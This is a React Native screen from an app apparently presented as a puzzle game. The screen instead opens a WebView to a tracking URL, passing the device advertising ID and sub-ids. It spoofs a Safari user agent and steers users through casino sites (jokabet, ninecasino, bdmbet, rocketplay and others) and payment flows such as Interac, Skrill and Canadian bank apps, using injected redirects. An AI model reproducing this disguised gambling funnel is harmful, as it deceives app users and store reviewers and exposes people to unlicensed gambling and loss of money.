import React, {useRef, useState, useEffect} from 'react';
import {
  View,
  SafeAreaView,
  TouchableOpacity,
  Alert,
  Linking,
  Image,
  BackHandler,
} from 'react-native';
import {WebView} from 'react-native-webview';
import DeviceInfo from 'react-native-device-info';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {useNavigation} from '@react-navigation/native';

const MercyrPuzzleGameAndroidProdactScreen = ({navigation, route}) => {
  const [aaid, setAaid] = useState(route.params?.aaid);
  console.log('aaid in Prod', aaid);
  const [uid, setUid] = useState(route.params?.uid);
  const [sab, setSab] = useState(route.params?.sab1);
  const [pid, setPid] = useState(route.params?.pid);
  const refWebview = useRef(null);

  const handleBackPress = () => {
    if (refWebview.current) {
      refWebview.current.goBack();
      return true; // Block the default behavior
    } else {
      navigation.goBack(); // Go back to the previous screen if no more pages in WebView
      return true;
    }
  };

  React.useEffect(() => {
    const backHandler = BackHandler.addEventListener(
      'hardwareBackPress',
      handleBackPress,
    );
    return () => backHandler.remove();
  }, []);

  const customSchemes = [
    'scotiabank',
    'bmoolbb',
    'cibcbanking',
    'conexus',
    'rbcmobile',
    'pcfbanking',
    'tdct',
    'blank',
  ];

  useEffect(() => {
    getData();
  }, []);

  useEffect(() => {
    setData();
  }, [aaid, uid, sab, pid]);

  const setData = async () => {
    try {
      const data = {
        aaid,
        uid,
        sab,
        pid,
      };
      const jsonData = JSON.stringify(data);
      await AsyncStorage.setItem('Prodact', jsonData);
      console.log('Дані збережено в AsyncStorage');
    } catch (e) {
      console.log('Помилка збереження даних:', e);
    }
  };

  const getData = async () => {
    try {
      const jsonData = await AsyncStorage.getItem('Prodact');
      if (jsonData !== null) {
        const parsedData = JSON.parse(jsonData);
        console.log('parsedData==>', parsedData);
        setAaid(parsedData.aaid);
        setUid(parsedData.uid);
        setSab(parsedData.sab);
        setPid(parsedData.pid);
      } else {
      }
    } catch (e) {
      console.log('Помилка отримання даних:', e);
    }
  };

  ////////////////////////////////
  let baseUrl = `https://brilliant-exalted-fun.space/XWmjRDd3?advertising_id=${aaid}&uid=${uid}`;
  let sabParts = sab ? sab.split('_') : [];
  let additionalParams = sabParts
    .map((part, index) => `sub_id_${index + 1}=${part}`)
    .join('&');

  const product = `${baseUrl}&${additionalParams}` + (pid ? `&pid=${pid}` : '');
  console.log('My product Url==>', product);

  //// кастомний юзерагент
  const deviceInfo = {
    deviceBrand: DeviceInfo.getBrand(),
    deviceId: DeviceInfo.getDeviceId(),
    deviceModel: DeviceInfo.getModel(),
    deviceSystemName: DeviceInfo.getSystemName(),
    deviceSystemVersion: DeviceInfo.getSystemVersion(),
  };
  const customUserAgent = `Mozilla/5.0 (${deviceInfo.deviceSystemName}; ${deviceInfo.deviceModel}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1`;

  //const customUserAgent = `Mozilla/5.0 (${deviceInfo.deviceSystemName}; ${deviceInfo.deviceModel}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1`;

  //const customUserAgent = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0`;

  console.log(customUserAgent);

  useEffect(() => {
    WebView.userAgent = customUserAgent;
  }, []);

  ///////////////////////////

  const [redirectUrl, setRedirectUrl] = useState(product);
  const [checkNineUrl, setCheckNineUrl] = useState();
  //console.log('checkNineUrl====>', checkNineUrl);

  const handleShouldStartLoad = event => {
    const {url} = event;
    //console.log('Should Start Load: ', url);
    return true;
  };
  {
    /**
  const handleNavigationStateChange = navState => {
    const {url} = navState;
    console.log('NavigationState: ', url);

    if (
      url.includes(
        'https://api.paymentiq.io/paymentiq/api/piq-redirect-assistance',
      )
    ) {
      setRedirectUrl(product);
    } else if (url.includes('https://ninecasino')) {
      setCheckNineUrl(product);
    } else if (
      url.includes('https://interac.express-connect.com/cpi?transaction=')
    ) {
      setRedirectUrl(product);
    } else if (url.includes('about:blank') && checkNineUrl === product) {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      console.log('Redirecting to:', redirectUrl);
    } else if (
      url.includes('neteller') ||
      url.includes('rapidtransfer') ||
      url.includes('skrill') ||
      (url.includes('paysafecard') && checkNineUrl === product)
    ) {
      console.log('Allowing navigation to:', url);
      return; // Allow navigation for these URLs
    } else {
      console.log('Blocking navigation to:', url);
      return false; // Block navigation to other URLs
    }
  };

  const onShouldStartLoadWithRequest = event => {
    const {url} = event;
    console.log('onShouldStartLoadWithRequest: ', url);

    if (url.startsWith('mailto:') || url.startsWith('itms-appss://')) {
      Linking.openURL(url);
      return false;
    } else if (
      url.includes('bitcoin') ||
      url.includes('litecoin') ||
      url.includes('dogecoin') ||
      url.includes('tether') ||
      url.includes('ethereum') ||
      url.includes('bitcoincash')
    ) {
      console.log('Blocking cryptocurrency URL:', url);
      return false;
    } else if (
      url.startsWith('https://m.facebook.com/') ||
      url.startsWith('https://www.facebook.com/') ||
      url.startsWith('https://www.instagram.com/') ||
      url.startsWith('https://twitter.com/') ||
      url.startsWith('https://www.whatsapp.com/') ||
      url.startsWith('https://t.me/')
    ) {
      Linking.openURL(url);
      return false;
    } else if (url.includes('pay.skrill.com') && checkNineUrl === product) {
      console.log('Handling Skrill URL:', url);
      Linking.openURL(url);
      return false;
    } else if (
      url === 'https://jokabet.com/' ||
      url === 'https://ninecasino.com/' ||
      url === 'https://bdmbet.com/' ||
      url === 'https://winspirit.app/?identifier=' ||
      url.includes('https://rocketplay.com/api/payments')
    ) {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      console.log('Redirecting to:', redirectUrl);
      return false;
    } else if (url.includes('secure.livechatinc.com/customer/action/')) {
      console.log('Blocking LiveChat URL:', url);
      return false;
    } else {
      const scheme = url.split(':')[0];
      if (customSchemes.includes(scheme)) {
        Linking.canOpenURL(url)
          .then(canOpen => {
            if (canOpen) {
              Linking.openURL(url).catch(error => {
                console.warn(`Unable to open URL: ${url}`, error);
              });
            } else {
              Alert.alert(`The ${scheme} app is not installed on your device.`);
            }
          })
          .catch(error => {
            console.warn(`Error checking if URL can be opened: ${url}`, error);
          });
        return false;
      }
    }

    return true;
  };
*/
  }

  const handleNavigationStateChange = navState => {
    const {url} = navState;
    //console.log('NavigationState: ', url);
    console.log('navState: ', navState);
    if (
      url.includes(
        'https://api.paymentiq.io/paymentiq/api/piq-redirect-assistance',
      )
    ) {
      setRedirectUrl(product);
    } else if (url.includes('https://ninecasino')) {
      setCheckNineUrl(product);
    } else if (
      url.includes('https://interac.express-connect.com/cpi?transaction=')
    ) {
      setRedirectUrl(product);
    } else if (url.includes('about:blank') && checkNineUrl === product) {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      console.log('xxxx');
    } else if (
      url.includes('neteller') ||
      url.includes('rapidtransfer') ||
      url.includes('skrill') ||
      (url.includes('paysafecard') && checkNineUrl === product)
    ) {
      //Linking.openURL(url);
      //return false;
      return; // Дозволити навігацію для цих URL-адрес
    }
  };

  const onShouldStartLoadWithRequest = event => {
    const {url} = event;
    console.log('onShouldStartLoadWithRequest: ', url);

    if (url.startsWith('mailto:')) {
      Linking.openURL(url);
      return false;
    } else if (url.startsWith('itms-appss://')) {
      Linking.openURL(url);
      return false;
    } else if (
      url.includes('bitcoin') ||
      url.includes('litecoin') ||
      url.includes('dogecoin') ||
      url.includes('tether') ||
      url.includes('ethereum') ||
      url.includes('bitcoincash')
    ) {
      return false;
    } else if (
      url.startsWith('https://m.facebook.com/') ||
      url.startsWith('https://www.facebook.com/') ||
      url.startsWith('https://www.instagram.com/') ||
      url.startsWith('https://twitter.com/') ||
      url.startsWith('https://www.whatsapp.com/') ||
      url.startsWith('https://t.me/') //||
      //url.includes('pay.skrill.com')
    ) {
      Linking.openURL(url);
      return false;
    } else if (url.includes('pay.skrill.com') && checkNineUrl === product) {
      console.log('Hello!!!!!!!!!!!!!!!!!!!!!');
      Linking.openURL(url);
      return false;
    } else if (url === 'https://jokabet.com/') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url === 'https://ninecasino.com/') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url === 'https://bdmbet.com/') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url === 'https://winspirit.app/?identifier=') {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url.includes('https://rocketplay.com/api/payments')) {
      refWebview.current.injectJavaScript(
        `window.location.href = '${redirectUrl}'`,
      );
      return false;
    } else if (url.includes('secure.livechatinc.com/customer/action/')) {
      //refWebview?.current?.goBack();
      return false;
    } else {
      const scheme = url.split(':')[0];
      if (customSchemes.includes(scheme)) {
        Linking.canOpenURL(url)
          .then(canOpen => {
            if (canOpen) {
              Linking.openURL(url).catch(error => {
                console.warn(`Unable to open URL: ${url}`, error);
              });
            } else {
              Alert.alert(`The ${scheme} app is not installed on your device.`);
            }
          })
          .catch(error => {
            console.warn(`Error checking if URL can be opened: ${url}`, error);
          });
        return false;
      }
    }

    return true;
  };

  //ф-ція для повернення назад
  const goBackBtn = () => {
    if (refWebview && refWebview.current) {
      refWebview?.current?.goBack();
    }
  };

  //ф-ція для оновлення сторінки
  const reloadPageBtn = () => {
    if (refWebview && refWebview.current) {
      refWebview?.current?.reload();
    }
  };
  return (
    <SafeAreaView style={{flex: 1, backgroundColor: '#191d24'}}>
      <WebView
        originWhitelist={[
          '*',
          'http://*',
          'https://*',
          'intent://*',
          'tel:*',
          'mailto:*',
        ]}
        onShouldStartLoadWithRequest={onShouldStartLoadWithRequest}
        onNavigationStateChange={handleNavigationStateChange}
        source={{uri: product}}
        style={{flex: 1}}
        ref={refWebview}
        textZoom={100}
        allowsBackForwardNavigationGestures={true}
        domStorageEnabled={true}
        javaScriptEnabled={true}
        allowsInlineMediaPlayback={true}
        setSupportMultipleWindows={false}
        mediaPlaybackRequiresUserAction={false}
        allowFileAccess={true}
        javaScriptCanOpenWindowsAutomatically={true}
        userAgent={customUserAgent}
      />
    </SafeAreaView>
  );
};

export default MercyrPuzzleGameAndroidProdactScreen;
